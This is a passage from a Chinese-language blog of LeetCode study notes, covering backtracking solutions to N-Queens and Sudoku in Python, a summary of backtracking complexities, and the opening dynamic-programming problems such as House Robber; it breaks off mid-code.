punctuation">]</span><span class="token punctuation">:</span>        <span class="token comment"># 用一个全局变量来存储结果</span>        self<span class="token punctuation">.</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># 用一个一维数组来存储每一行皇后的列位置</span>        board <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> n        <span class="token comment"># 用三个整数来分别记录每一列，每一条主对角线，和每一条副对角线上是否已经有皇后</span>        <span class="token comment"># 用位运算来加速判断和更新</span>        self<span class="token punctuation">.</span>cols <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>diag1 <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>diag2 <span class="token operator">=</span> <span class="token number">0</span>        <span class="token comment"># 从第 0 行开始回溯</span>        self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> board<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>result        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> row<span class="token punctuation">,</span> n<span class="token punctuation">,</span> board<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 如果已经到达最后一行，说明找到了一个解</span>        <span class="token keyword">if</span> row <span class="token operator">==</span> n<span class="token punctuation">:</span>            <span class="token comment"># 根据 board 数组生成棋盘字符串</span>            path <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                s <span class="token operator">=</span> <span class="token string">"."</span> <span class="token operator">*</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"Q"</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">)</span>            <span class="token comment"># 将结果添加到全局变量中</span>            self<span class="token punctuation">.</span>result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token comment"># 遍历当前行的每一列</span>        <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 计算当前位置的主对角线和副对角线的索引</span>            d1 <span class="token operator">=</span> row <span class="token operator">+</span> col            d2 <span class="token operator">=</span> row <span class="token operator">-</span> col <span class="token operator">+</span> n <span class="token operator">-</span> <span class="token number">1</span>            <span class="token comment"># 用位运算判断当前位置的列，主对角线，和副对角线是否为空</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>cols <span class="token operator">>></span> col<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>diag1 <span class="token operator">>></span> d1<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>diag2 <span class="token operator">>></span> d2<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token comment"># 如果为空，说明可以放置皇后</span>                <span class="token comment"># 更新 board 数组</span>                board<span class="token punctuation">[</span>row<span class="token punctuation">]</span> <span class="token operator">=</span> col                <span class="token comment"># 更新三个整数，将相应的位设为 1</span>                self<span class="token punctuation">.</span>cols <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> col                self<span class="token punctuation">.</span>diag1 <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> d1                self<span class="token punctuation">.</span>diag2 <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> d2                <span class="token comment"># 继续下一行的回溯</span>                self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span>row <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> board<span class="token punctuation">)</span>                <span class="token comment"># 回溯后，恢复 board 数组和三个整数的状态，将相应的位设为 0</span>                board<span class="token punctuation">[</span>row<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>                self<span class="token punctuation">.</span>cols <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> col<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>diag1 <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> d1<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>diag2 <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> d2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="37-解数独"><a class="markdownIt-Anchor" href="#37-解数独"></a> <a href="https://leetcode.cn/problems/sudoku-solver/">37. 解数独</a></h3><p>编写一个程序，通过填充空格来解决数独问题。</p><p>数独的解法需 <strong>遵循如下规则</strong>：</p><ol><li>数字 <code>1-9</code> 在每一行只能出现一次。</li><li>数字 <code>1-9</code> 在每一列只能出现一次。</li><li>数字 <code>1-9</code> 在每一个以粗实线分隔的 <code>3x3</code> 宫内只能出现一次。（请参考示例图）</li></ol><p>数独部分空格内已填入了数字，空白格用 <code>'.'</code> 表示。</p><h4 id="思路-15"><a class="markdownIt-Anchor" href="#思路-15"></a> 思路</h4><p>与N皇后十分相似，这题的解法也很明显，就是一个一个试，知道所有格子都填满，但是不同的在于，每一行每一列都需要遍历，所以这是二维回溯，前面的都是一维的回溯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">solveSudoku</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> board<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Do not return anything, modify board in-place instead.        """</span>        rows<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>board<span class="token punctuation">)</span>        cols<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>board<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>board<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#若有解返回True 无解则返回False</span>            <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rows<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cols<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment">#若格子里面有数字就直接跳过</span>                    <span class="token keyword">if</span> board<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'.'</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token comment">#逐个从1-9的数字中尝试填入这个格子</span>                    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> isValid<span class="token punctuation">(</span>row<span class="token punctuation">,</span>col<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>                            board<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>                            <span class="token comment">#填入下一个</span>                            <span class="token keyword">if</span>  dfs<span class="token punctuation">(</span>board<span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">return</span> <span class="token boolean">True</span>                            <span class="token comment">#回溯</span>                            board<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'.'</span>                    <span class="token comment">#如果9个数字都填过，说明这一步就无解，回溯到上一格子填入其他数字</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#递归结束 有解</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">def</span> <span class="token function">isValid</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span>col<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#同一列无重复的,范围一定是0-8  预设的还会有数字</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#同一行无重复</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> board<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#3X3九宫格无重复</span>            startRow<span class="token operator">=</span><span class="token punctuation">(</span>row<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>            startCol<span class="token operator">=</span><span class="token punctuation">(</span>col<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>startRow<span class="token punctuation">,</span>startRow<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>startCol<span class="token punctuation">,</span>startCol<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#如何这些限制条件都符合就可以放置</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        dfs<span class="token punctuation">(</span>board<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提交，过了，400多ms，尝试一下优化</p><h4 id="优化"><a class="markdownIt-Anchor" href="#优化"></a> 优化</h4><ul><li>初始化9个行set 快速查找行内是否存在重复,就不必n^2的查重操作了</li><li>9个列set 同理</li><li>9个块set</li><li>用一个empty_list存一下需要填的位置</li><li>开始回溯, 每次只放不重复的元素, 如果找到结果立刻返回, 不需要再多余计算</li><li>最后把结果填进原数组即可</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">solveSudoku</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> board<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Do not return anything, modify board in-place instead.        """</span>        lines <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        cols <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        sqs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        empty_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span> line <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>board<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> ch <span class="token operator">==</span> <span class="token string">'.'</span><span class="token punctuation">:</span>                    empty_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    cols<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    sqs<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token punctuation">(</span>j <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>empty_list<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>            i<span class="token punctuation">,</span> j <span class="token operator">=</span> empty_list<span class="token punctuation">[</span>k<span class="token punctuation">]</span>            <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token string">'123456789'</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>ch <span class="token keyword">in</span> lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> ch <span class="token keyword">in</span> cols<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token keyword">or</span> ch <span class="token keyword">in</span> sqs<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token punctuation">(</span>j <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    cols<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    sqs<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token punctuation">(</span>j <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    <span class="token keyword">if</span> dfs<span class="token punctuation">(</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">True</span>                    res<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>                    lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    cols<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    sqs<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token punctuation">(</span>j <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> r <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>empty_list<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">:</span>            board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><ul><li><p><strong>回溯是递归的副产品，只要有递归就会有回溯</strong>，所以回溯法也经常和二叉树遍历，其实抽象结构两者是相同的</p></li><li><p><strong>用递归控制for循环嵌套的数量</strong></p></li><li><p>搜索的过程：<strong>for循环横向遍历，递归纵向遍历，回溯不断调整结果集</strong></p></li><li><p><strong>剪枝精髓是：for循环在寻找起点的时候要有一个范围，如果这个起点到集合终止之间的元素已经不够题目要求的k个元素了，就没有必要搜索了</strong>。</p></li><li><p>集合元素会有重复，但要求解集不能包含重复的组合：**“树枝去重”和“树层去重”**组合问题可以抽象为树形结构，那么“使用过”在这个树形结构上是有两个维度的，一个维度是同一树枝上“使用过”，一个维度是同一树层上“使用过”。</p></li><li><p><strong>也可以使用set针对同一父节点本层去重，但子集问题一定要排序</strong></p></li><li><p><strong>使用used数组在时间复杂度上几乎没有额外负担！</strong></p></li><li><p>深度优先搜索也是用递归来实现的，所以往往伴随着回溯。</p></li><li><p><strong>单纯的回溯搜索（深搜）并不难，难还难在容器的选择和使用上</strong></p></li><li><p><strong>棋盘的宽度就是for循环的长度，递归的深度就是棋盘的高度，这样就可以套进回溯法的模板里了</strong>。</p></li><li><p>子集问题分析：</p><ul><li>时间复杂度：O(2<sup>n)，因为每一个元素的状态无外乎取与不取，所以时间复杂度为O(2</sup>n)</li><li>空间复杂度：O(n)，递归深度为n，所以系统栈所用空间为O(n)，每一层递归所用的空间都是常数级别，注意代码里的result和path都是全局变量，就算是放在参数里，传的也是引用，并不会新申请内存空间，最终空间复杂度为O(n)</li></ul><p>排列问题分析：</p><ul><li>时间复杂度：O(n!)，这个可以从排列的树形图中很明显发现，每一层节点为n，第二层每一个分支都延伸了n-1个分支，再往下又是n-2个分支，所以一直到叶子节点一共就是 n * n-1 * n-2 * … 1 = n!。</li><li>空间复杂度：O(n)，和子集问题同理。</li></ul><p>组合问题分析：</p><ul><li>时间复杂度：O(2^n)，组合问题其实就是一种子集的问题，所以组合问题最坏的情况，也不会超过子集问题的时间复杂度。</li><li>空间复杂度：O(n)，和子集问题同理。</li></ul><p>N皇后问题分析：</p><ul><li>时间复杂度：O(n!) ，其实如果看树形图的话，直觉上是O(n^n)，但皇后之间不能见面所以在搜索的过程中是有剪枝的，最差也就是O（n!），n!表示n * (n-1) * … * 1。</li><li>空间复杂度：O(n)，和子集问题同理。</li></ul><p>解数独问题分析：</p><ul><li>时间复杂度：O(9^m) , m是’.'的数目。</li><li>空间复杂度：O(n<sup>2)，递归的深度是n</sup>2</li></ul></li><li><p><img src="https://s2.loli.net/2024/03/09/T1hyWQ6j5X7LKlu.png" alt="" / loading="lazy"></p></li></ul><h1 id="动态规划基础版"><a class="markdownIt-Anchor" href="#动态规划基础版"></a> 动态规划(基础版)</h1><h2 id="斐波那契型"><a class="markdownIt-Anchor" href="#斐波那契型"></a> 斐波那契型</h2><h3 id="746-使用最小花费爬楼梯"><a class="markdownIt-Anchor" href="#746-使用最小花费爬楼梯"></a> <a href="https://leetcode.cn/problems/min-cost-climbing-stairs/">746. 使用最小花费爬楼梯</a></h3><p>给你一个整数数组 <code>cost</code> ，其中 <code>cost[i]</code> 是从楼梯第 <code>i</code> 个台阶向上爬需要支付的费用。一旦你支付此费用，即可选择向上爬一个或者两个台阶。</p><p>你可以选择从下标为 <code>0</code> 或下标为 <code>1</code> 的台阶开始爬楼梯。</p><p>请你计算并返回达到楼梯顶部的最低花费。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minCostClimbingStairs</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cost<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>cost<span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>cost<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>cost<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最基础的动态规划了吧，，，</p><p>写出最简单的状态转移方程就行了</p><h3 id="198-打家劫舍"><a class="markdownIt-Anchor" href="#198-打家劫舍"></a> <a href="https://leetcode.cn/problems/house-robber/">198. 打家劫舍</a></h3><p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，<strong>如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警</strong>。</p><p>给定一个代表每个房屋存放金额的非负整数数组，计算你 <strong>不触动警报装置的情况下</strong> ，一夜之内能够偷窃到的最高金额。</p><p><a href="https://leetcode.cn/problems/house-robber/solutions/138131/dong-tai-gui-hua-jie-ti-si-bu-zou-xiang-jie-cjavap/?envType=study-plan-v2&amp;envId=dynamic-programming">198. 打家劫舍 - 力扣-详细解析（LeetCode）</a></p><h4 id="思路-16"><a class="markdownIt-Anchor" href="#思路-16"></a> 思路</h4><p>偷k间房子的最大价值:可分解为2种偷法</p><ul><li>偷第k间+前k-2间房子最大价值</li><li>不偷第k间+前k-1间房子的最大价值</li></ul><p>根据此就可列出状态转移方程</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">rob</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>        dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于每次计算都只用了两个值</p><p>还可进一步优化空间复杂度为O(1)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    